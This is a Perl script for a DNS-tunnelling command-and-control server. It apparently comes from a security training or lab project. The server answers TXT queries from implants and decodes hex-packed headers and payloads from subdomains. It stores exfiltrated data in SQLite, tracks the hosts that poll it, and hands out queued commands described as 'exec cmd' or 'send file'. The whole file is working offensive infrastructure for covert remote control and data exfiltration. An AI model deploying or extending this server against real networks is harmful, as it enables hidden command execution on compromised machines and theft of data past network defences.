#!/usr/bin/env perl
use strict;
use warnings;
use lib "./tools/c2s/";
use config;
use Net::DNS;
use Net::DNS::Nameserver;
use Time::HiRes qw(sleep);
use Data::Dumper;
use Term::ANSIColor;
use DBI;
use Time::Piece;
use File::Basename qw(basename);

my $host = '0.0.0.0';
my $working_time_sec = 120;
my $port = 53;
my $myttl = 600;
my $sub_max_length = 63;
my $logging = 0;
my $logfile = '';
my $dry_run = 0;
my $cmd_dir = "tools/c2s/cmd/";
my $dbfile = 'c2dns.sqlite';
my $dbparam = "dbi:SQLite:dbname=$dbfile";

my $conf = config->new;

my $parent_server = $conf->{parent};

my @opt = @ARGV;

#if(defined($opt[0]) && $opt[0] eq 'init'){
if(! -f $dbfile){
  my $sth;
  my $dbh = DBI->connect($dbparam, undef,undef, {AutoCommit => 1});
  
  $sth = $dbh->prepare("CREATE TABLE log (id INTEGER PRIMARY KEY AUTOINCREMENT, remote_ip TEXT, tid INTEGER, seq INTEGER, data BLOB, opname TEXT);");
  $sth->execute();
  
  $sth = $dbh->prepare("CREATE TABLE status (id INTEGER PRIMARY KEY AUTOINCREMENT, remote_ip TEXT, tid INTEGER, opname BLOB, status INTEGER, last_update TEXT);");
  $sth->execute();
  
  $sth = $dbh->prepare("CREATE TABLE poll (id INTEGER PRIMARY KEY AUTOINCREMENT, remote_ip TEXT, last_update TEXT);");
  $sth->execute();
  
  $dbh->disconnect;
}

while(my $op = shift(@opt)){
  if($op eq '--log'){
    $logging = 1;
    $logfile = shift(@opt) || '';
  }
}

my $client_headers = {
  1 => {
    name => "cksum",
    length => 32, #bit
  },
  2 => {
    name => "id",
    length => 32, #bit
  },
  3 => {
    name => "seq",
    length => 32, #bit
  },
  4 => {
    name => "status",
    length => 8, #bit
  },
  5 => {
    name => "opt_flag",
    length => 8, #bit
  },
  6 => {
    name => "size",
    length => 8, #bit
  },
};

sub reply_handler {
  my ( $qname, $qclass, $qtype, $peerhost, $query, $conn ) = @_;
  my ( $rcode, @ans, @auth, @add );
 
  print "Received query from $peerhost to " . $conn->{sockhost} . "\n";
  $query->print;

  
  #if ( $qtype eq "A" && $qname eq "zansin.example.com" ) {
  if ( $qtype eq "A" && exists($conf->{record}->{$qname}) ) {
    my ( $ttl, $rdata ) = ( 3600, $conf->{record}->{$qname} ); # sample
    my $rr = new Net::DNS::RR("$qname $ttl $qclass $qtype $rdata");
    push @ans, $rr;
    $rcode = "NOERROR";
    if($logging){
        dlogger($qname, $qtype, $rr);
    }
  } elsif ( $qtype eq "TXT" && $qname ne "" ) {
    #================#
    #  c2connection  #
    #================#
    my $poll = 0;
    my $req = parse_data($qname, $peerhost);

    if(is_status_ok($req) && is_new_op($req)){
      # insert db
      logger("new operation", "*");
      insert_new_op($peerhost, $req);
    } elsif(is_status_ok($req) && is_close_op($req)){
      # insert db
      logger("close operation", "*");
      update_close_op($peerhost, $req);
    } elsif(is_status_ok($req) && is_push_op($req)){
      logger("push operation", "*");
      insert_push_op($peerhost, $req);
    } elsif(is_status_ok($req) && is_poll_op($req)){
      logger("poll operation", "*");
      update_poll_op($peerhost, $req);
    }


    my $rr = new Net::DNS::RR(
      owner   => 'txt.mini.local',
      type    => 'TXT',
      txtdata => [ $req->{rdata} ],
      );
    push(@ans, $rr);

    #dlogger($qname, $qtype, $rr);
    $rcode = "NOERROR";
  } else {
    $rcode = "NXDOMAIN";
  }
  
  # mark the answer as authoritative (by setting the 'aa' flag)
  my $headermask = {aa => 1};
  
  # specify EDNS options  { option => value }
  my $optionmask = {};
 
  return ( $rcode, \@ans, \@auth, \@add, $headermask, $optionmask );
}

 
my $ns = new Net::DNS::Nameserver(
    LocalAddr => $host,
    LocalPort    => $port,
    ReplyHandler => \&reply_handler,
    Verbose      => 1
    ) || die "couldn't create nameserver object\n";
 
 
$ns->start_server($working_time_sec);
#$ns->main_loop;

exit;


#==========================#
sub polling_op {
  my $peer = shift || die "cannot read peer host";
  my $aref = [];

  # read command file
  my $file = $peer . ".cmd";
  eval {
    open(my $fh, "<", $cmd_dir . basename($file) ) || die "cannot open file $!";
    flock($fh, 1);
    @$aref = readline($fh);
    logger("polling_op: command: @{$aref}", "-");
    close($fh);
    
  };
  if($@ || scalar(@$aref) == 0){
    push(@$aref, "0\tNOP");
  }

  # read command
  if($conf->sweep && scalar(@$aref) > 0){
    my @lines = @$aref;
    shift(@lines);
    
    eval {
      open(my $fh, ">", $cmd_dir . basename($file) ) || die "cannot open file $!";
      flock($fh, 2);
      print $fh join("", @lines);
      close($fh);
    };
    if($@){
      logger("polling_op: sweep section: " . $@, "!");
    }
  }


  logger("command: @$aref");
  
  return $aref;
}



sub update_poll_op {
  my $peer = shift || die "cannot read peer host";
  my $ref  = shift || "";

  if(ref($ref) ne "HASH"){
    return 0;
  }
  
  my $sth;
  my $dbh;

  my $t = localtime();
  
  # for debug
  logger("payload: " . $ref->{data});
  # "CREATE TABLE poll (id INTEGER PRIMARY KEY AUTOINCREMENT, remote_ip TEXT, last_update TEXT);"
  logger("update polling status\nremote_ip: $peer\nlast_update: ". $t->epoch . "\n");

  if(!$dry_run){
  eval {
    $dbh = DBI->connect($dbparam, undef, undef, {
      AutoCommit => 0,
      RaiseError => 1,
      PrintError => 0,
    }) || die "cannot connect database";

    $sth = $dbh->prepare("SELECT id FROM poll WHERE remote_ip=? LIMIT 1;")
                                               || die "cannot create statement handler";
    $sth->bind_param(1, $peer)                 || die "cannot set param";
    $sth->execute()                            || die "cannot execute operation";

    my @rows       = $sth->fetchrow_array();
    my $rows_count = scalar(@rows);
    logger("rows_count: $rows_count");
    if($rows_count){
      logger("update poll table: $peer");
      $sth = $dbh->prepare("UPDATE poll SET last_update=? WHERE remote_ip=?;")
                                                 || die "cannot create statement handler";
      $sth->bind_param(1, $t->epoch)             || die "cannot set param";
      $sth->bind_param(2, $peer)                 || die "cannot set param";
      $sth->execute()                            || die "cannot execute operation";
    } else {
      logger("insert poll table: $peer");
      $sth = $dbh->prepare("INSERT INTO poll (remote_ip, last_update) values(?,?);")
                                                 || die "cannot create statement handler";
      $sth->bind_param(1, $peer)                 || die "cannot set param";
      $sth->bind_param(2, $t->epoch)             || die "cannot set param";
      $sth->execute()                            || die "cannot execute operation";
    }

  };
  if($@){
    logger('something wrong with ' . $@, '!');
    
    $sth->finish;  # You need this for SQLite
    $dbh->rollback;
  } else {
    $dbh->commit;
  }
  

  $dbh->disconnect;
  
  } else {
    logger("current operation is dry-run.","*");
  }
  return 1;
}



sub insert_new_op {
  my $peer = shift || die "cannot read peer host";
  my $ref  = shift || "";

  if(ref($ref) ne "HASH"){
    return 0;
  }
  
  my $sth;
  my $dbh;

  # for debug
  logger("payload: " . $ref->{data});
  logger("insert data\nremote_ip: $peer\ntid: ". tid2dec($ref->{tid}) . "\ndata: ". hex2bin($ref->{data}) . "\nopt: " . opt2dec($ref->{opt}) . "\n");

  if(!$dry_run){
  eval {
    $dbh = DBI->connect($dbparam, undef, undef, {
      AutoCommit => 0,
      RaiseError => 1,
      PrintError => 0,
    }) || die "cannot connect database";

    my $t = localtime();
    $sth = $dbh->prepare("INSERT INTO status (remote_ip, tid, opname, status, last_update) values(?,?,?,?,?);")
                                               || die "cannot create statement handler";
    $sth->bind_param(1, $peer)                 || die "cannot set param";
    $sth->bind_param(2, tid2dec($ref->{tid}))  || die "cannot set param";
    $sth->bind_param(3, hex2bin($ref->{data})) || die "cannot set param";
    $sth->bind_param(4, opt2dec($ref->{opt}))  || die "cannot set param";
    $sth->bind_param(5, $t->epoch)             || die "cannot set param";
    $sth->execute()                            || die "cannot execute operation";
  };
  if($@){
    logger('something wrong with ' . $@, '!');
    
    $sth->finish;  # You need this for SQLite
    $dbh->rollback;
  } else {
    $dbh->commit;
  }
  

  $dbh->disconnect;
  
  } else {
    logger("current operation is dry-run.","*");
  }
  return 1;
}

sub insert_push_op {
  my $peer = shift || die "cannot read peer host";
  my $ref  = shift || "";

  if(ref($ref) ne "HASH"){
    return 0;
  }
  
  my $sth;
  my $dbh;

  # for debug
  logger("payload: " . $ref->{data});
  logger("insert data\nremote_ip: $peer\ntid: ". tid2dec($ref->{tid}) . "\nseq: ". seq2dec($ref->{seq}) .  "\ndata: ". hex2bin($ref->{data}) . "\n");

  if(!$dry_run){
  eval {
    $dbh = DBI->connect($dbparam, undef, undef, {
      AutoCommit => 0,
      RaiseError => 1,
      PrintError => 0,
    }) || die "cannot connect database";
    
    $sth = $dbh->prepare("INSERT INTO log (remote_ip, tid, seq, data) values(?,?,?,?);")
                                               || die "cannot create statement handler";
    $sth->bind_param(1, $peer)                 || die "cannot set param";
    $sth->bind_param(2, tid2dec($ref->{tid}))  || die "cannot set param";
    $sth->bind_param(3, seq2dec($ref->{seq}))  || die "cannot set param";
    $sth->bind_param(4, $ref->{data})          || die "cannot set param";  # HEX
    $sth->execute()                            || die "cannot execute operation";
  };
  if($@){
    logger('something wrong with ' . $@, '!');
    $sth->finish;  # You need this for SQLite
    $dbh->rollback;
  } else {
    $dbh->commit;
  }
  

  $dbh->disconnect;
  
  } else {
    logger("current operation is dry-run.","*");
  }
  return 1;
}

sub update_close_op {
  my $peer = shift || die "cannot read peer host";
  my $ref  = shift || "";

  if(ref($ref) ne "HASH"){
    return 0;
  }
  
  my $sth;
  my $dbh;

  # for debug
  logger("payload: " . $ref->{data});
  logger("update data\nremote_ip: $peer\ntid: ". tid2dec($ref->{tid}) . "\ndata: ". hex2bin($ref->{data}) . "\nopt: " . opt2dec($ref->{opt}) . "\n");

  if(!$dry_run){
  eval {
    $dbh = DBI->connect($dbparam, undef, undef, {
      AutoCommit => 0,
      RaiseError => 1,
      PrintError => 0,
    }) || die "cannot connect database";

    my $t = localtime();
    $sth = $dbh->prepare("UPDATE status SET status=?, last_update=? WHERE tid=?;")
                                               || die "cannot create statement handler";
    $sth->bind_param(1, opt2dec($ref->{opt}))  || die "cannot set param";
    $sth->bind_param(2, $t->epoch)             || die "cannot set param";
    $sth->bind_param(3, tid2dec($ref->{tid}))  || die "cannot set param";
    $sth->execute()                            || die "cannot execute operation";
  };
  if($@){
    logger('something wrong with ' . $@, '!');
    
    $sth->finish;  # You need this for SQLite
    $dbh->rollback;
  } else {
    $dbh->commit;
  }
  

  $dbh->disconnect;
  
  } else {
    logger("current operation is dry-run.","*");
  }
  return 1;
}

sub is_status_ok {
  my $href = shift;
  if( $href->{status} == 1 ){
    return 1;
  } else {
    return 0;
  }
}

sub is_new_op {
  my $href = shift;
  if( opt2dec($href->{opt} == 1 ) ){
    return 1;
  } else {
    return 0;
  }
}

sub is_close_op {
  my $href = shift;
  if( opt2dec($href->{opt} == 2 ) ){
    return 1;
  } else {
    return 0;
  }
}

sub is_push_op {
  my $href = shift;
  if( opt2dec($href->{opt} == 3 ) ){
    return 1;
  } else {
    return 0;
  }
}

sub is_poll_op {
  my $href = shift;
  if( opt2dec($href->{opt} == 4 ) ){
    return 1;
  } else {
    return 0;
  }
}


sub query {
  my $parent_server = shift;
  my $host = shift;
  my $type = shift || 'A';
  my $res = new Net::DNS::Resolver(
      nameserver => $parent_server,
  );

  my $rep = $res->search($host, $type) || {};
  
  if (exists($rep->{answer})) {
    if($logging){
      for my $rr ($rep->answer) {
        dlogger($host, $type, $rr);
      }
    }
  } else {
    warn "query failed: ", $res->errorstring, "\n";
  }
  return $rep;
}



sub parse_data {
  my $query  = shift || "";
  my $peer   = shift || "";
  my $href;
  my $rh;

  logger("in parse_data", '*');
  return 0 if $query eq "";

  my ($headers, @payload) = split(/\./, $query);
  my $domain_stratum = scalar (split(/\./, $conf->domain));
  for(1..$domain_stratum){
    pop(@payload);
  }
  my $payload = join("", @payload);
  logger("request header: $headers");
  logger("request payload: $payload");
  $href = {
    cksum  => substr($headers,  0, 8),
    tid    => substr($headers,  8, 8),
    seq    => substr($headers, 16, 8),
    opt    => substr($headers, 24, 2),
    sub    => substr($headers, 26, 2),
    size   => substr($headers, 28, 2),
    data   => $payload,
    status => 0,
    rh     => {},
    rdata  => '',
  };
  logger("received headers(hex): " . Dumper($href));

  my $cksum = cksum2dec($href->{cksum});
  # for debug
  #$cksum = 1;
  logger("original checksum: $cksum");

  my $calc_data = substr($query, 8, (length($query) - 8 - length($conf->domain) - 1) );
  $calc_data =~ s/\.//g;
  my $cksum2 = get_chksum($calc_data);
  logger("check checksum: " . $cksum2);

  if($cksum != $cksum2){
    logger("invalid checksum","!");
    $rh = {
      tid => $href->{tid},
      ack => $href->{seq},
      opt => opt2hex(2),   # request retransmission
      sub => sub2hex(0),
    };
    
    my $res_header = $rh->{tid} . $rh->{ack} . $rh->{opt} . $rh->{sub};
    my $res_cksum  = cksum2hex(get_chksum($res_header));
    logger("res cksum: " . cksum2dec($res_cksum));
    logger("res header(NG): " . $res_cksum . $res_header );
    $href->{rh} = $rh;
    $href->{rdata} = $res_cksum . $res_header;
    $href->{status} = 0;
    
  } else {
    logger("checksum OK");
    # received complete
    my $sub = 0;
    my $payload = '';
    if(opt2dec($href->{opt}) == 4){
      # is_polling
      my $aref_op = polling_op($peer);
      ($sub, $payload) = split(/\t/, $aref_op->[0]);
      logger("sub: $sub", "*");
      $sub = 0 if ! defined($sub) || int($sub) > 255;
      $payload =~ s/\r?\n//;
    }
    logger("payload: $payload");
    
    my $ack = size2dec($href->{size}) + seq2dec($href->{seq});
    logger("recieve size: " . size2dec($href->{size}) );
    logger("total recieve size: $ack");
    $rh = {
      tid     => $href->{tid},
      ack     => ack2hex($ack),
      opt     => opt2hex(1),          # normal status
      sub     => sub2hex(int($sub)),  # 1: exec cmd, 2: send file
      payload => bin2hex($payload),
    };
    

    logger("response headers(hex): " . Dumper($rh));
    my $res_header = $rh->{tid} . $rh->{ack} . $rh->{opt} . $rh->{sub};
    my $res_data   = $rh->{payload};
    my $res_cksum  = cksum2hex(get_chksum($res_header . $res_data));
    logger("res cksum: " . cksum2dec($res_cksum));
    logger("res header(OK): " . $res_cksum . $res_header . $res_data );
    $href->{rh} = $rh;
    my @res_data = $res_data =~ m/(.{1,$sub_max_length})/g;
    $res_data = join(".", @res_data);
    logger("res_data: " . $res_data, "-");
    $href->{rdata}  = $res_cksum . $res_header . ".$res_data";
    $href->{status} = 1;
    
  }
  
  return $href;
}

sub ack2hex {
    my $dec = shift;    
    return unpack("H*", pack("N", $dec));
}

sub cksum2dec {
    my $hex = shift;
    return unpack("N", pack("H*", $hex));
}
sub tid2dec {
    my $hex = shift;
    return unpack("N", pack("H*", $hex));
}
sub seq2dec {
    my $hex = shift;
    return unpack("N", pack("H*", $hex));
}
sub opt2dec {
    my $hex = shift;
    return unpack("C", pack("H*", $hex));
}
sub sub2dec {
    my $hex = shift;
    return unpack("C", pack("H*", $hex));
}
sub size2dec {
    my $hex = shift;
    return unpack("C", pack("H*", $hex));
}


sub cksum2hex {
    my $dec = shift;
    return unpack("H*", pack("N", $dec));
}
sub tid2hex {
    my $dec = shift;
    return unpack("H*", pack("N", $dec));
}
sub seq2hex {
    my $dec = shift;
    return unpack("H*", pack("N", $dec));
}
sub opt2hex {
    my $dec = shift;
    return unpack("H*", pack("C", $dec));
}
sub sub2hex {
    my $dec = shift;
    return unpack("H*", pack("C", $dec));
}
sub size2hex {
    my $dec = shift;
    return unpack("H*", pack("C", $dec));
}


sub hex2bin {
    my $hex = shift;
    return pack("H*", $hex);
}


sub bin2hex {
    my $bin = shift;
    return unpack("H*", $bin);
}


sub dlogger {
  my $host = shift;
  my $type = shift;
  my $rr   = shift;
  my $str  = '';
  $str = scalar(localtime()) . " $host ($type) => " . $rr->address . "\n" if $rr->can("address");
  #open(my $fh, '>>', $logfile) || die "can not open file: `$!'";
  #flock($fh, 2);
  #print $fh $str;
  #close($fh);
  return 1;
}


sub logger {
  my $m = shift || "";
  my $o = shift || "+";
  my $log = sprintf("[%s] %s", $o, $m);

  if($o eq '*'){
    print colored($log, 'yellow on_magenta'), "\n";
  } elsif($o eq '!'){
    print colored($log, 'red on_bright_yellow'), "\n";
  } elsif($o eq '-'){
    print colored($log, 'yellow on_blue'), "\n";
  } else {
    print colored($log, 'yellow'), "\n";
  }
  return 1;
}


sub get_chksum {
  my $data  = shift;
  logger("generate checksum from: ${data}");
  return Net_CHKSUM::chksum( $data );
}


#################################################################

package Net_CHKSUM;
our $VERSION = '0.00001';
use strict;
use Carp;
use Time::HiRes;

sub chksum {
    my $p = shift;
    my $debug = shift;
    my $sum = 0;

    my $s = Time::HiRes::time() if $debug;

    # padding data 0x00 if $p length is odd
    $p .= pack(qq/C/, 0) if length($p) % 2 == 1;
    carp "length: " . length($p) if $debug;

    for my $n (unpack("n*", $p)) {
        $sum += $n;
    }

    if ($debug) {
        carp "sum decimal               : " . $sum;
        carp "sum binary                : " . unpack("B*", pack("N", $sum));
        carp "sum >> 16                 : " . unpack("B*", pack("n", $sum >> 16));
        carp "sum & 0xffff              : " . unpack("B*", pack("n", $sum & 0xffff));
    }
    $sum = ($sum >> 16) + ($sum & 0xffff); # 1�̕␔�a
    if ($debug) {
        carp "sum binary                : " . unpack("B*", pack("n", $sum));
    }
    $sum = ~(($sum >> 16) + ($sum & 0xffff)) & 0x0000ffff; 
    if ($debug) {
        carp "sum reverse binary        : " . unpack("B*", pack("n", $sum)); # reverse
        carp "sum reverse binary to hex : " . unpack("H*", pack("n", $sum)); # reverse
    }
    $s = sprintf "%0.5f", Time::HiRes::time - $s if $debug;
    return $sum, $s if $debug;
    return $sum;
    #return unpack("n", pack("n", $sum));
}

1;

